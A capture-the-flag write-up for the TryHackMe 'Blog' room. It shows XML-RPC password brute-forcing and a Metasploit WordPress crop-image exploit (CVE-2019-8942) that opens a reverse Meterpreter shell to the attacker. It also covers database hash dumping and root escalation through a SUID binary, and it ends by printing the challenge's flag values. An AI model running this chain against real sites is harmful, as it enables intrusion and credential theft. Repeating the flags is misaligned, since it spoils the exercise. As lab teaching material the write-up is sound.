# TryHackMe — Blog | Full Writeup

**Room:** <https://tryhackme.com/room/blog>  
**Difficulty:** Medium  
**OS:** Linux

Blog is a WordPress-themed box that runs a genuinely outdated CMS version, which turns out to be the entire point: WordPress 5.0.0 is vulnerable to a real CVE that lets an authenticated low-privilege user get code execution through the image-crop feature. Getting those WordPress credentials means enumerating users and brute-forcing through XML-RPC rather than the login form. The box also plants two deliberate distractions — an SMB share full of decoy images, and a fake `user.txt` sitting in the obvious home directory — before the real privilege escalation, which comes down to a custom SUID binary that only checks whether an environment variable exists, not what it's set to.

---

## 1. Setup

The site relies on name-based virtual hosting, so it only resolves correctly with a hosts-file entry:

```
echo "$IP blog.thm" | sudo tee -a /etc/hosts
```

---

## 2. Reconnaissance

```
nmap -p- --open -sC -sV $IP
```

```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH 7.6p1 Ubuntu
80/tcp  open  http         Apache httpd 2.4.29
139/tcp open  netbios-ssn  Samba smbd 3.X - 4.X
445/tcp open  microsoft-ds Samba smbd 4.7.6-Ubuntu
```

The nmap script output also fingerprints the CMS directly:

```
| http-generator: WordPress 5.0
```

WordPress 5.0.0 has a known, unpatched RCE — the whole box hinges on that single version number.

---

## 3. SMB — A Deliberate Rabbit Hole

```
smbclient -L //$IP/ -N
smbclient //$IP/BillySMB -N
```

The `BillySMB` share holds a handful of images. Checking them for hidden data is the obvious move:

```
steghide extract -sf <image>.jpg
strings <image>.png
exiftool <image>.jpg
```

One image does have a text file embedded in it, but its contents don't lead to any credential or foothold. This share exists purely to cost time — nothing found here factors into the actual compromise.

---

## 4. WordPress Enumeration

```
wpscan --url http://blog.thm --enumerate ap,at,u --detection-mode aggressive
```

```
[+] WordPress version: 5.0 (Insecure, released on 2018-12-06)
[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php

[i] User(s) Identified:
    [+] kwheel
    [+] bjoel
```

The same usernames are reachable without WPScan at all, through WordPress's own REST API:

```
http://blog.thm/wp-json/wp/v2/users
```

Two things matter here: the confirmed 5.0 version lines up with a known CVE, and there are now two usernames to attack.

---

## 5. Credential Brute-Force via XML-RPC

Rather than hammering `wp-login.php` directly, WPScan can drive the brute-force through XML-RPC, which by default has no rate limiting or lockout on WordPress:

```
wpscan --url http://blog.thm -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt -t 50
```

```
[SUCCESS] - kwheel / cutiepie1
```

**Credentials:** `kwheel:cutiepie1`. The `bjoel` account's password doesn't fall to rockyou — only one of the two accounts was ever meant to be crackable.

---

## 6. Exploitation — CVE-2019-8942 (WordPress Crop-Image RCE)

WordPress 5.0.0 and earlier mishandle the file path used when cropping an uploaded image: the path comes from a database "post meta" value that isn't sanitized before being used to write a file. An authenticated user with author-level access or higher can point that value at a PHP file of their choosing, effectively writing a webshell to disk through a feature that was never meant to accept arbitrary paths. The bug was patched in 5.0.1; this box runs exactly the vulnerable version.

```
msfconsole
use exploit/multi/http/wp_crop_rce
set RHOSTS $IP
set LHOST $LHOST
set LPORT 4444
set USERNAME kwheel
set PASSWORD cutiepie1
set TARGETURI /
run
```

```
[+] Authenticated with WordPress
[*] Uploading payload
[+] Meterpreter session 1 opened
```

Meterpreter lands as `www-data`. Dropping to a real shell and stabilizing it:

```
meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 7. Post-Exploitation — The Fake Flag

```
cd /home/bjoel
ls -la
cat user.txt
```

```
You won't find what you're looking for here.
TRY HARDER
```

This `user.txt` is intentionally fake. The same directory holds a PDF describing bjoel's termination from a company referred to in-lore as "Rubber Ducky Inc." — a planted clue that the real flag sits on a mounted USB device, not in the home directory. It only becomes readable after privilege escalation, since `www-data` can't reach that mount point yet.

The WordPress config was also worth a look:

```
cat /var/www/wordpress/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD"
mysql -u wordpress -p wordpress
SELECT user_login, user_pass FROM wp_users;
```

The `wp_users` table returns bcrypt hashes for both accounts — computationally expensive to crack and not needed for the intended path, so this is a second dead end rather than a shortcut.

---

## 8. Privilege Escalation — The `checker` Binary

```
find / -perm -u=s -type f 2>/dev/null
```

Among the expected SUID binaries sits one that doesn't belong on a stock Ubuntu install:

```
/usr/sbin/checker
```

Running it plainly does nothing useful:

```
/usr/sbin/checker
Not an Admin
```

`ltrace` shows exactly what it's checking without needing to reverse-engineer anything:

```
ltrace /usr/sbin/checker
```

```
getenv("admin")   = nil
puts("Not an Admin")
```

The binary only checks whether an environment variable named `admin` **exists** — not what it's set to. Since the binary is SUID root, satisfying that check is enough to get a root shell out of it:

```
export admin=1
/usr/sbin/checker
```

```
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

---

## 9. Capturing Both Flags

```
cat /root/root.txt
```

```
find / -name "user.txt" 2>/dev/null
```

```
/home/bjoel/user.txt   ← fake
/media/usb/user.txt    ← real
```

```
cat /media/usb/user.txt
```

The USB mount was inaccessible before root, which is exactly why the fake flag in `bjoel`'s home directory exists — to catch anyone who stops enumerating the moment they find *a* file named `user.txt`.

---

## Attack Chain

```
nmap ($IP → 22, 80, 139, 445; WordPress 5.0 fingerprinted)
  └─→ SMB share "BillySMB" → steganography checks → rabbit hole, no useful data
  └─→ wpscan / wp-json REST API → users: kwheel, bjoel
        └─→ XML-RPC brute-force → kwheel:cutiepie1
              └─→ CVE-2019-8942 (wp_crop_rce) → Meterpreter as www-data
                    └─→ /home/bjoel/user.txt → fake flag, PDF hints at USB mount
                    └─→ wp-config.php / wp_users → bcrypt hashes, dead end
                          └─→ find -perm -u=s → /usr/sbin/checker
                                └─→ ltrace → getenv("admin") existence check
                                      └─→ export admin=1 → root shell
                                            └─→ /root/root.txt
                                            └─→ /media/usb/user.txt (real flag)
```

---

## Key Concepts

| Concept | Explanation |
|---|---|
| **Version fingerprinting via nmap scripts** | `http-generator` and similar NSE scripts often hand over the exact CMS version in the initial scan, which is frequently enough on its own to point straight at a known CVE without any further probing. |
| **Deliberate rabbit holes** | Not every share, file, or hash the box exposes is meant to be used. An SMB share full of images and a set of bcrypt password hashes both look promising but lead nowhere — recognizing a dead end and moving on is as much a skill as finding the real path. |
| **XML-RPC as a brute-force target** | WordPress's XML-RPC endpoint (`xmlrpc.php`) accepts authentication attempts without the rate-limiting or lockout that the standard login form may have, making it a faster and quieter brute-force surface when it's enabled. |
| **CVE-2019-8942 — unsanitized path in image cropping** | Letting a database-stored value control a filesystem path without validation is a classic path-manipulation bug; here it turns "edit an image" into "write a PHP file anywhere the web server can write." |
| **In-lore clues as enumeration hints** | A PDF about a company name isn't just flavor text — CTF designers frequently embed the next pivot point in text that looks like backstory. Reading everything a foothold gives access to, not just scanning for files that look technical, is part of the process. |
| **SUID binary with an existence-only check** | Checking whether an environment variable is set, with no value validation and no privilege check beyond that, is not a security control — any process running in that shell can set the variable and satisfy the check trivially. |
| **ltrace over static reverse engineering** | For a binary that's just making library calls (like `getenv`), `ltrace` shows the exact call and its result in one command, which is often faster than opening a disassembler when the logic turns out to be this simple. |

---

## Flags

| Flag | Path | Value |
|---|---|---|
| user.txt (fake) | `/home/bjoel/user.txt` | `TRY HARDER` (decoy, not a real flag) |
| user.txt (real) | `/media/usb/user.txt` | `c8421899aae571f7af486492b71a8ab7` |
| root.txt | `/root/root.txt` | `9a0b2b618bef9bfa7ac28c1353d9f318` |
